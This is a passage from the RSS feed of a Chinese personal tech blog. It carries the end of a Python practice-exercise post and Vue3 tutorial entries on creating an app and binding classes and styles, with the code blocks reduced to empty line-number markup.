class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 计算文件大小</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 三级菜单</h2>
<ul>
<li>运行程序输出第一级菜单</li>
<li>选择一级菜单某项，输出二级菜单，同理输出三级菜单</li>
<li>可返回上一级</li>
<li>可随时退出程序</li>
</ul>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 文件监听</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 发红包</h2>
<p>指定红包大小，并随机发几份红包。</p>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 递归问路</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 人狗大战</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 计算器</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 检验文件一致性</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 博客园登录</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 学生选课系统</h2>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
]]></content:encoded>
    </item>
    <item>
      <title>Vue3</title>
      <link>https://sankgao.github.io/computers/framework/vue3/</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/</guid>
      <source url="https://sankgao.github.io/rss.xml">Vue3</source>
      <description>记录一些 Vue3 相关的信息。</description>
      <category>Framework</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 Vue3 相关的信息。</p>
<!-- more -->
<h2> Vue3</h2>
<ul>
<li><a href="/computers/framework/vue3/introduction.html" target="blank">简介</a></li>
<li><a href="/computers/framework/vue3/quick_start.html" target="blank">快速上手</a></li>
<li><a href="/computers/framework/vue3/application.html" target="blank">创建一个 Vue 应用</a></li>
<li><a href="/computers/framework/vue3/template_syntax.html" target="blank">模板语法</a></li>
<li><a href="/computers/framework/vue3/responsive_base.html" target="blank">响应式基础</a></li>
<li><a href="/computers/framework/vue3/computed.html" target="blank">计算属性</a></li>
<li><a href="/computers/framework/vue3/class_and_style_bind.html" target="blank">Class 与 Style 绑定</a></li>
<li><a href="/computers/framework/vue3/ways_of_using_vue.html" target="blank">使用 Vue 的多种方式</a></li>
<li><a href="/computers/framework/vue3/conditional.html" target="blank">条件渲染</a></li>
<li><a href="/computers/framework/vue3/list.html" target="blank">列表渲染</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>创建一个 Vue 应用</title>
      <link>https://sankgao.github.io/computers/framework/vue3/application.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/application.html</guid>
      <source url="https://sankgao.github.io/rss.xml">创建一个 Vue 应用</source>
      <description>应用实例 每个 Vue 应用都是通过 createApp 函数创建一个新的 应用实例： 根组件 传入 createApp 的对象实际上是一个组件，每个应用都需要一个 根组件，其他组件将作为其子组件。 如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。 大多数真实的应用都是由一棵 嵌套的、可重用的 组件树组成的。例如：一个待办事项（Todo...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 应用实例</h2>
<p>每个 Vue 应用都是通过 <code>createApp</code> 函数创建一个新的 <strong>应用实例：</strong></p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 根组件</h2>
<p>传入 <code>createApp</code> 的对象实际上是一个组件，每个应用都需要一个 <strong>根组件</strong>，其他组件将作为其子组件。</p>
<p>如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>大多数真实的应用都是由一棵 <strong>嵌套的</strong>、<strong>可重用的</strong> 组件树组成的。例如：一个待办事项（Todos）应用的组件树可能是这样的：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 挂载应用</h2>
<p>应用实例必须在调用了 <code>.mount()</code> 方法后才会渲染出来。该方法接收一个 “容器” 参数，可以是一个实际的 DOM 元素或是一个 CSS 选择器字符串：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>应用根组件的内容将会被渲染在容器元素里面。容器元素自己将 <strong>不会</strong> 被视为应用的一部分。</p>
<p><code>.mount()</code> 方法应该始终在整个应用配置和资源注册完成后被调用。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>.mount()</code> 方法不同于其他资源注册方法，它的返回值是 <strong>根组件实例</strong> 而非 <strong>应用实例</strong></p>
</div>
<h3> DOM 中的根组件模板</h3>
<p>当在未采用构建流程的情况下使用 Vue 时，可以在挂载容器中直接书写根组件模板：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当根组件没有设置 <code>template</code> 选项时，Vue 将自动使用容器的 <code>innerHTML</code> 作为模板。</p>
<h2> 应用配置</h2>
<p>应用实例会暴露一个 <code>.config</code> 对象，用于配置一些应用级的选项。例如：定义一个应用级的错误处理器，用来捕获所有子组件上的错误。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>应用实例还提供了一些方法来注册应用范围内可用的资源。例如：注册一个组件。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这使得 <code>TodoDeleteButton</code> 在应用的任何地方都是可用的。</p>
<p>确保在挂载应用实例之前完成所有应用配置！</p>
<h2> 多个应用实例</h2>
<p>应用实例并不只限于一个。<code>createApp</code> API 函数允许你在同一个页面中创建多个共存的 Vue 应用，而且每个应用都拥有自己的用于配置和全局资源的 <strong>作用域。</strong></p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container note">
<p class="hint-container-title">注</p>
<p>如果你正在使用 Vue 来增强服务端渲染 HTML，并且只想要 Vue 去控制一个大型页面中特殊的一小部分，应避免将一个单独的 Vue 应用实例挂载到整个页面上，而是应该创建多个小的应用实例，将它们分别挂载到所需的元素上去</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Class 与 Style 绑定</title>
      <link>https://sankgao.github.io/computers/framework/vue3/class_and_style_bind.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/class_and_style_bind.html</guid>
      <source url="https://sankgao.github.io/rss.xml">Class 与 Style 绑定</source>
      <description>数据绑定的一个常见需求场景是操纵元素的 CSS class 列表 和 内联样式。因为 class 和 style 都是 attribute，我们可以和其他 attribute 一样使用 v-bind 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue 专门为 class 和 style 的 v-bi...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>数据绑定的一个常见需求场景是操纵元素的 CSS <strong>class 列表</strong> 和 <strong>内联样式</strong>。因为 <code>class</code> 和 <code>style</code> 都是 attribute，我们可以和其他 attribute 一样使用 <code>v-bind</code> 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue 专门为 <code>class</code> 和 <code>style</code> 的 <code>v-bind</code> 用法提供了特殊的功能增强。除了字符串外，<strong>表达式</strong> 的值也可以是对象或数组。</p>
<h2> 绑定 HTML class</h2>
<h3> 绑定对象</h3>
<p>给 <code>:class</code>（<code>v-bind:class</code> 的缩写）传递一个对象来动态切换 class：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上面的语法表示 <code>active</code> 是否存在取决于数据属性 <code>isActive</code> 的 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Truthy" target="_blank" rel="noopener noreferrer">真假值</a>。</p>
<p>你可以在对象中写多个字段来操作多个 class。此外，<code>:class</code> 指令也可以和一般的 <code>class</code> attribute 共存。例如：下面这样的状态：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>配合以下模板：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>渲染的结果会是：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当 <code>isActive</code> 或者 <code>hasError</code> 改变时，class 列表会随之更新。例如：如果 <code>hasError</code> 变为 <code>true</code>，class 列表也会变成 <code>"static active text-danger"</code>。</p>
<p>绑定的对象并不一定需要写成内联字面量的形式，也可以直接绑定一个对象：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这也会渲染出相同的结果。也可以绑定一个返回对象的 <a href="/computers/framework/vue3/computed.html" target="blank">计算属性</a>。这是一个常见且很有用的技巧：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> 绑定数组</h3>
<p>给 <code>:class</code> 绑定一个数组来渲染多个 CSS class：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>渲染的结果是：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果你也想在数组中有条件地渲染某个 class，你可以使用三元表达式：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>errorClass</code> 会一直存在，但 <code>activeClass</code> 只会在 <code>isActive</code> 为真时才存在。</p>
<p>然而，这可能在有多个依赖条件的 class 时会有些冗长。因此也可以在数组中嵌套对象：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> 在组件上使用</h3>
<p>对于只有一个根元素的组件，当你使用了 <code>class</code> attribute 时，这些 class 会被添加到根元素上，并与该元素上已有的 class 合并。</p>
<p>例如：如果你声明了一个组件名叫 <code>MyComponent</code>，模板如下：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在使用时添加一些 class：</p>
